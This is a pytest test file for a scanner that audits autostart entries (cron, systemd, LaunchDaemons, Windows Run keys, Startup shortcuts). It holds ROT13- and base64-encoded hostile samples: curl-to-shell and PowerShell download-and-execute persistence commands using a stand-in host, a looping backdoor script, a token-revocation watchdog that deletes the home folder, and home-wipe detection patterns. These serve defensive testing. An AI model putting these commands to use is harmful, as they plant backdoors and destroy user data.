"""System-wide autostart, cron, and Windows Run keys / Startup folder (extends test_autostart.py).

Hostile samples are stored ROT13-encoded and decoded at test time (see test_skillscan.py).
"""
import codecs
import plistlib
import struct
from pathlib import Path

import pytest

from asca import autostart
from asca.model import Severity

R = {
    "cron_pipe": "*/30 * * * * phey -f uggcf://rknzcyr.vainyvq/h | fu",
    "sys_cron_pipe": "@erobbg ebbg phey -f uggcf://rknzcyr.vainyvq/h | onfu",
    "ps_iex": 'cbjrefuryy -j uvqqra -p "vje uggcf://rknzcyr.vainyvq/c.cf1 | vrk"',
    "ps1_body": "$p = (Arj-Bowrpg Arg.JroPyvrag).QbjaybnqFgevat('uggcf://rknzcyr.vainyvq/c')\nVaibxr-Rkcerffvba $p\n",
    "ps_watchdog": '$g = Trg-Pbagrag "$rai:HFRECEBSVYR\\.pbasvt\\aup\\gbxra"\njuvyr ($gehr) {\n  gel { Vaibxr-ErfgZrgubq '
                   'uggcf://ncv.tvguho.pbz/hfre -Urnqref @{Nhgubevmngvba="Ornere $g"} }\n  pngpu { vs ($_.Rkprcgvba.'
                   'Erfcbafr.FgnghfPbqr.inyhr__ -va 401,403) { Erzbir-Vgrz -Erphefr -Sbepr $rai:HFRECEBSVYR } }\n  '
                   'Fgneg-Fyrrc 45\n}\n',
    "sys_backdoor_sh": "#!/ova/fu\njuvyr gehr; qb phey -f uggcf://rknzcyr.vainyvq/p | fu; fyrrc 3600; qbar\n",
}
ENC = "aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGkAbgB2AGEAbABpAGQALwB4ACAAfAAgAGkAZQB4AA=="  # UTF-16 base64


def r(k):
    return codecs.decode(R[k], "rot13")


def w(p: Path, text: str) -> Path:
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text, encoding="utf-8")
    return p


@pytest.fixture
def env(tmp_path):
    home = tmp_path / "home" / "alice"
    home.mkdir(parents=True)
    return home, tmp_path / "root"


def run(home, root, run_keys=(), user="alice"):
    return autostart.audit(home, st := {}, root=root, user=user, run_keys=list(run_keys)), st


def got(fs):
    return sorted((f.rule, f.severity.name) for f in fs)


# ---------------------------------------------------------------- system units and LaunchDaemons
def test_system_service_running_hidden_script_is_high(env):
    home, root = env
    w(root / "var/tmp/.cache/upd.sh", r("sys_backdoor_sh"))
    w(root / "etc/systemd/system/upd.service",
      f"[Service]\nExecStart=/bin/sh {(root / 'var/tmp/.cache/upd.sh').as_posix()}\n")
    fs, st = run(home, root)
    assert got(fs) == [("host.system-autostart", "HIGH")] and "at boot" in fs[0].title
    assert st["system_autostart_entries"] == 1 and st["user_autostart_entries"] == 0


def test_launchdaemon_and_system_script_outside_home(env):
    home, root = env
    script = w(root / "usr/local/lib/acme/sync.sh", r("sys_backdoor_sh"))
    p = root / "Library/LaunchDaemons/com.acme.sync.plist"
    p.parent.mkdir(parents=True)
    p.write_bytes(plistlib.dumps({"Label": "x", "ProgramArguments": ["/bin/sh", script.as_posix()], "RunAtLoad": True}))
    assert got(run(home, root)[0]) == [("host.system-autostart", "MEDIUM")]   # strong signal, not hidden


def test_distro_units_running_binaries_are_quiet(env):
    home, root = env
    w(root / "etc/systemd/system/sshd.service", "[Service]\nExecStart=/usr/sbin/sshd -D\n")
    w(root / "etc/xdg/autostart/nm-applet.desktop", "[Desktop Entry]\nExec=nm-applet\n")
    w(root / "usr/local/bin/backup.sh", "#!/bin/sh\ntar czf /var/backups/etc.tgz /etc\n")
    w(root / "etc/systemd/system/backup.service", f"[Service]\nExecStart={(root / 'usr/local/bin/backup.sh').as_posix()}\n")
    fs, st = run(home, root)
    assert fs == [] and st["system_autostart_entries"] == 3


# ---------------------------------------------------------------- cron
def test_user_crontab_pipe_to_shell(env):
    home, root = env
    w(root / "var/spool/cron/crontabs/alice", "SHELL=/bin/sh\n# m h dom mon dow command\n" + r("cron_pipe") + "\n")
    fs, _ = run(home, root)
    assert got(fs) == [("host.user-autostart", "MEDIUM")] and "a cron command" in fs[0].title
    assert fs[0].location.endswith("alice:3") and "on a schedule" in fs[0].title


def test_other_users_and_system_crontab(env):
    home, root = env
    w(root / "etc/crontab", "17 * * * * root cd / && run-parts --report /etc/cron.hourly\n" + r("sys_cron_pipe") + "\n")
    w(root / "var/spool/cron/bob", r("cron_pipe") + "\n")                      # RHEL layout, another user
    fs, _ = run(home, root)
    assert got(fs) == [("host.system-autostart", "MEDIUM")] * 2
    assert any("at boot" in f.title for f in fs) and any("user bob" in f.title for f in fs)


def test_cron_runs_hidden_script(env):
    home, root = env
    w(home / ".local/share/runtimes/sync.py", "import urllib.request, json\njson.load(urllib.request.urlopen("
                                               "'https://api.github.com/search/commits?q=x'))\n")
    w(root / "var/spool/cron/crontabs/alice", "@reboot /usr/bin/python3 $HOME/.local/share/runtimes/sync.py\n")
    fs, _ = run(home, root)
    assert got(fs) == [("host.user-autostart", "HIGH")] and "at boot" in fs[0].title


@pytest.mark.parametrize("line,system,want", [
    ("0 3 * * * /usr/bin/backup", False, [(1, "/usr/bin/backup", False)]),
    ("@reboot /x/y", False, [(1, "/x/y", True)]),
    ("0 3 * * * root /usr/bin/backup --all", True, [(1, "/usr/bin/backup --all", False)]),
    ("MAILTO=me@example.com", False, []),
    ("# 0 3 * * * /x", False, []),
    ("0 3 * *", False, []),
])
def test_cron_lines(line, system, want):
    assert autostart.cron_lines(line, system) == want


def test_unreadable_crontab_is_skipped(env, monkeypatch):
    home, root = env
    p = w(root / "var/spool/cron/crontabs/carol", r("cron_pipe") + "\n")
    real = Path.read_text

    def deny(self, *a, **k):
        if self == p:
            raise PermissionError(13, "Permission denied", str(self))
        return real(self, *a, **k)
    monkeypatch.setattr(Path, "read_text", deny)
    fs, st = run(home, root)
    assert fs == [] and st["autostart_unreadable"] == 1


# ---------------------------------------------------------------- Windows Run keys and Startup folder
def test_run_key_powershell_iwr_iex(env):
    home, root = env
    fs, _ = run(home, root, run_keys=[(r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Updater", r("ps_iex"))])
    assert got(fs) == [("host.user-autostart", "MEDIUM")] and "downloads and runs code" in fs[0].title
    assert fs[0].location.endswith(r"\Run\Updater")


def test_run_key_encoded_command_is_decoded(env):
    home, root = env
    keys = [(r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "svc", f"powershell.exe -NoP -W Hidden -enc {ENC}")]
    fs, _ = run(home, root, run_keys=keys)
    assert got(fs) == [("host.system-autostart", "MEDIUM")] and "downloads and runs code" in fs[0].title


def test_run_key_script_in_appdata_is_high_and_switch_is_critical(env):
    home, root = env
    w(home / "AppData/Roaming/Acme/u.ps1", r("ps1_body"))
    w(home / "AppData/Local/nhc/w.ps1", r("ps_watchdog"))
    keys = [(r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "acme",
             r'powershell -ExecutionPolicy Bypass -File "%APPDATA%\Acme\u.ps1"'),
            (r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "nhc",
             r'pwsh -w hidden -File %LOCALAPPDATA%\nhc\w.ps1')]
    fs, _ = run(home, root, run_keys=keys)
    assert got(fs) == [("host.revoke-switch", "CRITICAL"), ("host.user-autostart", "HIGH")]
    sw = next(f for f in fs if f.rule == "host.revoke-switch")
    assert "deletes your home folder" in sw.detail and "Run value" in sw.remediation


def test_run_key_plain_exe_is_quiet(env):
    home, root = env
    keys = [(r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Discord",
             r'"%LOCALAPPDATA%\Discord\Update.exe" --processStart Discord.exe'),
            (r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "SecurityHealth",
             r"%windir%\system32\SecurityHealthSystray.exe")]
    assert run(home, root, run_keys=keys)[0] == []


def _lnk(target: str, args: str) -> bytes:
    """Minimal shell link: header + LinkInfo (local base path, unicode) + ARGUMENTS string data."""
    flags = 0x02 | 0x20 | 0x80                               # HasLinkInfo, HasArguments, IsUnicode
    # HeaderSize, CLSID, LinkFlags, FileAttributes, 3 FILETIMEs, FileSize, IconIndex, ShowCommand, HotKey, 10 reserved
    hdr = struct.pack("<I16sIIQQQIiIH", 0x4C, b"\x01\x14\x02" + b"\x00" * 5 + b"\xc0" + b"\x00" * 6 + b"\x46",
                      flags, 0, 0, 0, 0, 0, 0, 1, 0) + b"\x00" * 10
    assert len(hdr) == 0x4C
    vol = struct.pack("<IIII", 0x11, 3, 0, 0x10) + b"\x00"
    ansi = target.encode("latin-1") + b"\x00"
    uni = target.encode("utf-16-le") + b"\x00\x00"
    hsize = 0x24
    vol_off = hsize
    base_off = vol_off + len(vol)
    suffix_off = base_off + len(ansi)
    ubase_off = suffix_off + 1
    body = vol + ansi + b"\x00" + uni + b"\x00\x00"
    info = struct.pack("<IIIIIIIII", hsize + len(body), hsize, 1, vol_off, base_off, 0, suffix_off, ubase_off,
                       ubase_off + len(uni)) + body
    a = args.encode("utf-16-le")
    return hdr + info + struct.pack("<H", len(args)) + a


def test_parse_lnk_roundtrip():
    data = _lnk(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "-w hidden -c x")
    assert autostart.parse_lnk(data) == (r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "-w hidden -c x")
    assert autostart.parse_lnk(b"not a link") == ("", "")


def test_startup_folder_shortcut_and_script(env):
    home, root = env
    st = home / "AppData/Roaming" / autostart.STARTUP
    st.mkdir(parents=True)
    ps = r("ps_iex").split(" ", 1)
    (st / "Updater.lnk").write_bytes(_lnk(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", ps[1]))
    w(st / "run.bat", "@echo off\r\n" + r("ps_iex") + "\r\n")
    w(st / "desktop.ini", "[.ShellClassInfo]\n")
    w(root / "ProgramData" / autostart.STARTUP / "notes.lnk", "")            # unreadable shortcut: skipped
    fs, _ = run(home, root)
    assert got(fs) == [("host.user-autostart", "HIGH"), ("host.user-autostart", "MEDIUM")]
    # run.bat sits in AppData (hidden) -> high; the shortcut's inline command -> medium


def test_windows_home_wipe_patterns():
    for t in ("Remove-Item -Recurse -Force $env:USERPROFILE", "Remove-Item $HOME -Recurse",
              "rd /s /q %USERPROFILE%", 'rmdir /s /q "%USERPROFILE%"'):
        assert autostart.wipes(t), t
    for t in ("Remove-Item -Recurse $env:USERPROFILE\\AppData\\Local\\Temp\\x", "rd /s /q %TEMP%\\build"):
        assert not autostart.wipes(t), t


def test_switch_warning_reaches_secret_findings_from_system_entries(env):
    home, root = env
    w(root / "var/tmp/.x/w.ps1", r("ps_watchdog"))
    w(root / "etc/systemd/system/w.service", f"[Service]\nExecStart=/usr/bin/pwsh -File {(root / 'var/tmp/.x/w.ps1').as_posix()}\n")
    fs, _ = run(home, root)
    assert got(fs) == [("host.revoke-switch", "CRITICAL")]
    from asca.model import Finding
    sec = Finding(rule="secret.x", category="secrets", severity=Severity.HIGH, title="t", location="/a",
                  remediation="Rotate it.")
    assert autostart.guard_remediation(fs + [sec]) == 1 and "w.service" in sec.remediation
